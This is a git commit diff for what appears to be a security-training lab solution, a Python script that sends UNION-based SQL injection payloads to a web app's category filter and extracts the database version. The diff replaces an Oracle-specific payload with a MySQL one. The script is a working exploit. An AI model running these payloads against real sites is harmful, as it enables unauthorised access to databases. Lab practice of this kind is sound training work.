0727e301205e8d9595ee21cb576c5bd43e74018f
Jaco Zwarts <jacozwarts@hotmail.com>
2023-09-14 10:30:16 +1000

    #3 Finished lab8

--- SQL Injection/Lab8/sqli-lab-08.py
+++ SQL Injection/Lab8/sqli-lab-08.py
@@ -1,32 +1,34 @@
-import requests
 import sys
+import requests
 import urllib3
-from bs4 import BeautifulSoup
 import re
-
+from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
+
+
 def exploit_sqli_version(url):
-    path = "/filter?category=Gifts"
-    sql_payload = "' UNION SELECT banner, NULL from v$version--"
+    path = "/filter?category=Accessories"
+    sql_payload = "' UNION SELECT @@version, NULL%23"
     r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
     res = r.text
-    if "Oracle Database" in res:
-        print("[+] Found the database version.")
-        soup = BeautifulSoup(res,'html.parser')
-        version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
-        print("[+] The Oracle database version is: " + version)
-        return True
-    return False
+    soup = BeautifulSoup(res, 'html.parser')
+    version = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
+    if version is None:
+        return False
+    else:
+        print("[+] The database version is: " + version)
+        return True 
+
 
 if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
-        print("[-] Example: %s www.example.com" % sys.argv[0])
+        print("[-] Example: %s www.example.com" %sys.argv[0])
         sys.exit(-1)
 
     print("[+] Dumping the version of the database...")
